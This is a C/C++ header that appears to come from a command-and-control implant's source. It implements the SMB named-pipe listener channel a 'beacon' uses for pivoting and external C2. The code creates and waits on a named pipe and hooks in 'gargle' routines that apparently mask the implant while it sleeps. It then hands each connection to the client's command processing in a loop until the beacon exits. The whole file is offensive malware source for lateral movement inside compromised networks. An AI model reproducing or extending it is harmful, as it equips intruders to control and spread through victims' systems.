#pragma once

/* Shared body of the SMB-listener beacon channel. Included exactly once per
 * binary by client_smb.cpp (pivot) and client_smb_extc2.cpp (external C2).
 * The per-binary differences live in the including file: smb_init() (DACL vs
 * NULL security attributes) and lchannel_smb_gargle() (the extc2 variant
 * overrides read/write with its message-mode split-write channel). */

#include <windows.h>
#include "beacon.h"
#include "client.h"

extern unsigned int post_type;
extern unsigned int sleep_time;

static HANDLE pipe;

BOOL GarglePipeWait(HANDLE pipe);
void GargleBlockPipe(HANDLE pipe);

/* call our gargle function */
static void link_channel_smb_wait(void * thisp) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	GargleBlockPipe(inst->pipe);
}

/*
* wait for a connection to our named pipe
*/
void smb_wait() {
	if (GarglePipeWait(pipe)) {
		/* we have a connection, yay */
	}
	else {											/* plan B */
		DWORD fConnected = 0;

		/* wait for a connection to our pipe */
		while (!fConnected) {
			fConnected = ConnectNamedPipe(pipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
		}
	}

	/* OK, kick off our client init routine. */
	client_init(lchannel_smb_gargle(pipe));
}

/* stop everything */
void smb_stop() {
	/* OK, shut everything down! */
	CloseHandle(pipe);

	/* clean up the resources with our last go */
	client_stop();
}

/*
* put this beacon into a mode where it's waiting for a connection to its pipe
*/
void command_link_wait() {
	/* setup our SMB server */
	if (!smb_init()) {
		return;
	}

	/* while we are an SMB server... do this stuff */
	while (sleep_time > 0) {
		/* wait for a connection and send our agent id */
		smb_wait();

		/* process data */
		client_process();

		/* close the session */
		FlushFileBuffers(pipe);
		DisconnectNamedPipe(pipe);
	}

	/* we're no longer an SMB server... stop the shenanigans */
	smb_stop();

	/* just kill the process... it's this or crash */
	safe_exit();
}
